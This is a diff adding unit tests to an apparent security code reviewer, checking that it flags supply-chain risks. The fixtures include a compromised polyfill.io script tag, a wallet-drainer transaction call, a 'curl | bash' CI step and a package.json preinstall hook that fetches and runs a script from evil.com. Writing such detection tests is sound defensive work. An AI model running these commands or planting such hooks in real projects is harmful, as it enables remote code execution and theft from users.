@@ -285,3 +285,52 @@ jobs:
         assert "test.py" in report
         assert "Mutable Default Argument" in report
 
+    def test_polyfill_compromised_cdn_detected(self):
+        code = '<script src="https://cdn.polyfill.io/v3/polyfill.min.js"></script>\n'
+        results = self.reviewer.review_snippet(code, language="javascript", file_path="index.html")
+        assert len(results) >= 1
+        found = any("Polyfill.io" in r.title for r in results)
+        assert found
+        item = next(r for r in results if "Polyfill.io" in r.title)
+        assert item.severity == "CRITICAL"
+        assert "cloudflare.com" in item.corrected_code
+
+    def test_external_script_missing_sri_detected(self):
+        code = '<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>\n'
+        results = self.reviewer.review_snippet(code, language="javascript", file_path="index.html")
+        assert len(results) >= 1
+        found = any("Subresource Integrity" in r.title for r in results)
+        assert found
+        item = next(r for r in results if "Subresource Integrity" in r.title)
+        assert "integrity=" in item.corrected_code
+
+    def test_web3_wallet_drainer_detected(self):
+        code = "await ethereum.request({ method: 'eth_sendTransaction', params: [drainPayload] });\n"
+        results = self.reviewer.review_snippet(code, language="javascript", file_path="drain.js")
+        assert len(results) >= 1
+        found = any("Wallet Drainer" in r.title for r in results)
+        assert found
+        item = next(r for r in results if "Wallet Drainer" in r.title)
+        assert item.severity == "CRITICAL"
+
+    def test_codecov_bash_uploader_detected(self):
+        code = "name: CI\njobs:\n  test:\n    steps:\n      - run: curl -s https://codecov.io/bash | bash\n"
+        results = self.reviewer.review_snippet(code, language="yaml", file_path=".github/workflows/ci.yml")
+        assert len(results) >= 1
+        found = any("Codecov Bash Uploader" in r.title for r in results)
+        assert found
+        item = next(r for r in results if "Codecov Bash Uploader" in r.title)
+        assert item.severity == "HIGH"
+        assert "codecov-action@" in item.corrected_code
+
+    def test_dangerous_lifecycle_script_package_json_detected(self):
+        code = '{\n  "name": "malicious-pkg",\n  "scripts": {\n    "preinstall": "curl -s http://evil.com/setup.sh | bash"\n  }\n}\n'
+        results = self.reviewer.review_file("package.json", code)
+        assert len(results) >= 1
+        found = any("Dangerous Package Lifecycle Script" in r.title for r in results)
+        assert found
+        item = next(r for r in results if "Dangerous Package Lifecycle Script" in r.title)
+        assert item.severity == "CRITICAL"
+        assert "ua-parser-js" in item.error_explanation
+
+
